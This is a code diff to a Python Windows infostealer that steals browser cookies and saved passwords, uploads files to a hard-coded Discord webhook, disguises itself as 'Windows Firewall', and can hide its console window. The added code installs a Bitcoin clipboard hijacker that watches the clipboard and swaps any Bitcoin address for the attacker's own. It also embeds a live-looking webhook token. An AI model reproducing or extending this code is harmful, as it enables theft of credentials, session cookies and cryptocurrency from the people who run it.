@@ -13,12 +13,16 @@ from PIL import ImageGrab
 import ctypes
 import sys
 import getpass
+import re
+import subprocess
 from os import environ, path
 from win32crypt import CryptUnprotectData
 import json
 import base64
 import sqlite3
 import browser_cookie3
+import time
+import logging
 import win32crypt
 from Crypto.Cipher import AES
 import shutil
@@ -26,7 +30,8 @@ from datetime import datetime, timedelta
 from base64 import b64decode
 
 # Configuration
-webhookURL = "Webhook"
+BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v'
+webhookURL = "https://discord.com/api/webhooks/853056645164957716/zgHTM0Sq7cWT5FdULGAcCHtYJ9_I0Is6kRlhHH4Y3d_BEAdjNRXOm58aP07lEIali8MX"
 hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
@@ -53,6 +58,49 @@ PATHS = {
     "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
+
+class Clipboard:
+    def __init__(self):
+        self.kernel32 = ctypes.windll.kernel32
+        self.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
+        self.kernel32.GlobalLock.restype = ctypes.c_void_p
+        self.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
+
+        self.user32 = ctypes.windll.user32
+        self.user32.GetClipboardData.restype = ctypes.c_void_p
+
+    def __enter__(self):
+        self.user32.OpenClipboard(0)
+        if self.user32.IsClipboardFormatAvailable(1):
+            data  = self.user32.GetClipboardData(1)
+            data_locked = self.kernel32.GlobalLock(data)
+            text = ctypes.c_char_p(data_locked)
+            value = text.value
+            self.kernel32.GlobalUnlock(data_locked)
+
+            try:
+                return value.decode()
+
+            except Exception as e:
+                return ''
+
+    def __exit__(self, exc_type, exc_value, exc_traceback):
+        self.user32.CloseClipboard()
+
+class Methods:
+    regex = '^(bc1|[13])[a-zA-HJ-NP-Z0-9]+'
+
+    @staticmethod
+    def set_clipboard(text):
+        return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)
+
+    def check(self, text):
+        try:
+            regex_check = re.findall(self.regex, text)
+            if regex_check:
+                return True
+        except Exception as e:
+            return False
 
 class Logger():
     def startup():
@@ -326,6 +374,15 @@ class Logger():
             urlopen(Request(webhookURL, data=dumps(webhook).encode(), headers=getheaders()))
         except Exception as e:
             print(e)
+    def btcClip():
+        m = Methods()
+        while True:
+            with Clipboard() as clipboard:
+                time.sleep(0.1)
+                target_clipboard = clipboard
+            if m.check(target_clipboard):
+                m.set_clipboard(BTC_ADDRESS)
+            time.sleep(1)
     def start():
         if hiddenWindow:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
@@ -335,7 +392,7 @@ class Logger():
         Logger.cookieLog()
         Logger.passwordLog()
         Logger.uploadFiles()
-        print("Done!")
+        Logger.btcClip()
 
 if __name__ == '__main__':
     Logger.start()
